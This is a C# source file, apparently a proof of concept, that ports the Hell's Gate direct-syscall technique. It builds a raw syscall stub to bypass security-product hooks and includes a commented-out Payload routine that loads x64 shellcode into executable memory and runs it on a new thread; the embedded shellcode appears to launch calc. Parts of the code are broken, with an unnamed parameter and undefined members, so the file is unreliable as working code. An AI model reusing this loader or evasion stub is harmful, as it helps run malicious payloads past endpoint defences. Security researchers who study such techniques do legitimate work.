using System;
using SharpHellsGate.Win32;
using System.Runtime.InteropServices;

namespace SharpHellsGate {
    public class HellsGate {

        [DllImport("kernel32.dll")]
        public static extern bool VirtualProtect(
          IntPtr lpAddress,
          int dwSize,
          uint flNewProtect,
          out uint lpflOldProtect
       );

        private byte[] GetHellsGate(byte high, byte low) {
            return new byte[] {
                0x4c, 0x8b, 0xd1,                                // mov  r10, rcx
                0xb8, low, high, 0x00, 0x00,                     // mov  eax, <syscall
                0xf6, 0x04, 0x25, 0x08, 0x03, 0xfe, 0x7f, 0x01,  // test byte ptr [SharedUserData+0x308],1
                0x75, 0x03,                                      // jne  ntdll!<function>+0x15
                0x0f, 0x05,                                      // syscall
                0xc3,                                            // ret
                0xcd, 0x2e,                                      // int  2Eh
                0xc3                                             // ret
            };
        }

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        private delegate UInt32 NtAllocateVirtualMemoryDelegate(
            UIntPtr ProcessHandle,
            ref IntPtr BaseAddress,
            ulong ZeroBits,
            ref ulong RegionSize,
            ulong AllocationType,
            ulong Protect
        );

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        private delegate UInt32 NtProtectVirtualMemoryDelegate(
            UIntPtr ProcessHandle,
            ref IntPtr BaseAddress,
            ref ulong NumberOfBytesToProtect,
            ulong NewAccessProtection,
            out ulong OldAccessProtection
        );

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        private delegate UInt32 NtCreateThreadExDelegate(
            ref UIntPtr hThread,
            uint DesiredAccess,
            IntPtr ObjectAttributes,
            UIntPtr ProcessHandle,
            IntPtr lpStartAddress,
            IntPtr lpParameter,
            bool CreateSuspended,
            uint StackZeroBits,
            uint SizeOfStackCommit,
            uint SizeOfStackReserve,
            IntPtr lpBytesBuffer
        );

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        private delegate UInt32 NtWaitForSingleObjectDelegate(
            UIntPtr ObjectHandle,
            bool Alertable,
            ref Structures.LARGE_INTEGER TimeOuts
        );
        /*
        private unsafe T NtInvocation<T>(Int16) where T: Delegate {
            byte[] gate = GetHellsGate(Entry.High, Entry.Low);
            fixed (byte* ptr = gate) {
                bool success = VirtualProtect((IntPtr)ptr, gate.Length, 0x40, out uint lpflOldProtect);
                if (!success)
                    return default;

                return Marshal.GetDelegateForFunctionPointer<T>((IntPtr)ptr);
            }
        }

        private UInt32 NtAllocateVirtualMemory(UIntPtr ProcessHandle, ref IntPtr BaseAddress, ulong ZeroBits, ref ulong RegionSize, ulong AllocationType, ulong Protect) {
            NtAllocateVirtualMemoryDelegate Func = NtInvocation<NtAllocateVirtualMemoryDelegate>(this.Table.NtAllocateVirtualMemory);
            return Func(ProcessHandle, ref BaseAddress, ZeroBits, ref RegionSize, AllocationType, Protect);
        }

        private UInt32 NtProtectVirtualMemory(UIntPtr ProcessHandle, ref IntPtr BaseAddress, ref ulong NumberOfBytesToProtect, ulong NewAccessProtection, ref ulong OldAccessProtection) {
            NtProtectVirtualMemoryDelegate Func = NtInvocation<NtProtectVirtualMemoryDelegate>(this.Table.NtProtectVirtualMemory);
            return Func(ProcessHandle, ref BaseAddress, ref NumberOfBytesToProtect, NewAccessProtection, out OldAccessProtection);
        }

        private UInt32 NtCreateThreadEx(ref UIntPtr hThread, uint DesiredAccess, IntPtr ObjectAttributes, UIntPtr ProcessHandle, IntPtr lpStartAddress, IntPtr lpParameter, bool CreateSuspended, uint StackZeroBits, uint SizeOfStackCommit, uint SizeOfStackReserve, IntPtr lpBytesBuffer) {
            NtCreateThreadExDelegate Func = NtInvocation<NtCreateThreadExDelegate>(this.Table.NtCreateThreadEx);
            return Func(ref hThread, DesiredAccess, ObjectAttributes, ProcessHandle, lpStartAddress, lpParameter, CreateSuspended, StackZeroBits, SizeOfStackCommit, SizeOfStackReserve, lpBytesBuffer);
        }

        private UInt32 NtWaitForSingleObject(UIntPtr ObjectHandle, bool Alertable, ref Structures.LARGE_INTEGER TimeOuts) {
            NtWaitForSingleObjectDelegate Func = NtInvocation<NtWaitForSingleObjectDelegate>(this.Table.NtWaitForSingleObject);
            return Func(ObjectHandle, Alertable, ref TimeOuts);
        }

        public void Payload() {

            // Pointers
            IntPtr pBaseAddres = IntPtr.Zero;

            // shellcode
            byte[] shellcode = new byte[272] {
                0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xc0,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,
                0x51,0x56,0x48,0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,0x18,0x48,
                0x8b,0x52,0x20,0x48,0x8b,0x72,0x50,0x48,0x0f,0xb7,0x4a,0x4a,0x4d,0x31,0xc9,
                0x48,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0x41,0xc1,0xc9,0x0d,0x41,
                0x01,0xc1,0xe2,0xed,0x52,0x41,0x51,0x48,0x8b,0x52,0x20,0x8b,0x42,0x3c,0x48,
                0x01,0xd0,0x8b,0x80,0x88,0x00,0x00,0x00,0x48,0x85,0xc0,0x74,0x67,0x48,0x01,
                0xd0,0x50,0x8b,0x48,0x18,0x44,0x8b,0x40,0x20,0x49,0x01,0xd0,0xe3,0x56,0x48,
                0xff,0xc9,0x41,0x8b,0x34,0x88,0x48,0x01,0xd6,0x4d,0x31,0xc9,0x48,0x31,0xc0,
                0xac,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0x38,0xe0,0x75,0xf1,0x4c,0x03,0x4c,
                0x24,0x08,0x45,0x39,0xd1,0x75,0xd8,0x58,0x44,0x8b,0x40,0x24,0x49,0x01,0xd0,
                0x66,0x41,0x8b,0x0c,0x48,0x44,0x8b,0x40,0x1c,0x49,0x01,0xd0,0x41,0x8b,0x04,
                0x88,0x48,0x01,0xd0,0x41,0x58,0x41,0x58,0x5e,0x59,0x5a,0x41,0x58,0x41,0x59,
                0x41,0x5a,0x48,0x83,0xec,0x20,0x41,0x52,0xff,0xe0,0x58,0x41,0x59,0x5a,0x48,
                0x8b,0x12,0xe9,0x57,0xff,0xff,0xff,0x5d,0x48,0xba,0x01,0x00,0x00,0x00,0x00,
                0x00,0x00,0x00,0x48,0x8d,0x8d,0x01,0x01,0x00,0x00,0x41,0xba,0x31,0x8b,0x6f,
                0x87,0xff,0xd5,0xbb,0xf0,0xb5,0xa2,0x56,0x41,0xba,0xa6,0x95,0xbd,0x9d,0xff,
                0xd5,0x48,0x83,0xc4,0x28,0x3c,0x06,0x7c,0x0a,0x80,0xfb,0xe0,0x75,0x05,0xbb,
                0x47,0x13,0x72,0x6f,0x6a,0x00,0x59,0x41,0x89,0xda,0xff,0xd5,0x63,0x61,0x6c,
                0x63,0x00
            };
            ulong Size = (ulong)shellcode.Length;
            Util.LogInfo($"Shellcode size: {Size} bytes");

            // Flags
            ulong MEM_COMMIT = 0x00001000;
            ulong PAGE_READWRITE = 0x04;
            ulong PAGE_EXECUTE_READ = 0x20;

            // Allocate Memory
            UInt32 status = NtAllocateVirtualMemory(Macros.GetCurrentProcess(), ref pBaseAddres, 0, ref Size, MEM_COMMIT, PAGE_READWRITE);
            if (status != 0x00) {
                Console.WriteLine("Error ntdll!NtAllocateVirtualMemory");
                return;
            }
            Util.LogInfo($"Page address:   0x{pBaseAddres:x16}");

            // Copy Memory
            Marshal.Copy(shellcode, 0, pBaseAddres, shellcode.Length);
            Array.Clear(shellcode, 0, shellcode.Length);

            // Change memory protection
            ulong OldAccessProtection = 0;
            status = NtProtectVirtualMemory(Macros.GetCurrentProcess(), ref pBaseAddres, ref Size, PAGE_EXECUTE_READ, ref OldAccessProtection);
            if (status != 0x00) {
                Console.WriteLine("Error ntdll!NtProtectVirtualMemory");
                return;
            }

            UIntPtr hThread = UIntPtr.Zero;
            status = NtCreateThreadEx(ref hThread, 0x1FFFFF, IntPtr.Zero, Macros.GetCurrentProcess(), pBaseAddres, IntPtr.Zero, false, 0, 0, 0, IntPtr.Zero);
            if (hThread == UIntPtr.Zero || !Macros.NT_SUCCESS(status)) {
                Console.WriteLine("Error ntdll!NtCreateThreadEx");
                return;
            }
            Util.LogInfo($"Thread handle:  0x{hThread:x16}\n");

            // Wait for one second
            Structures.LARGE_INTEGER Timeout = new Structures.LARGE_INTEGER {
                QuadPart = 10_000_000
            };
            NtWaitForSingleObject(hThread, false, ref Timeout);
            return;
        }
        */
    }
}
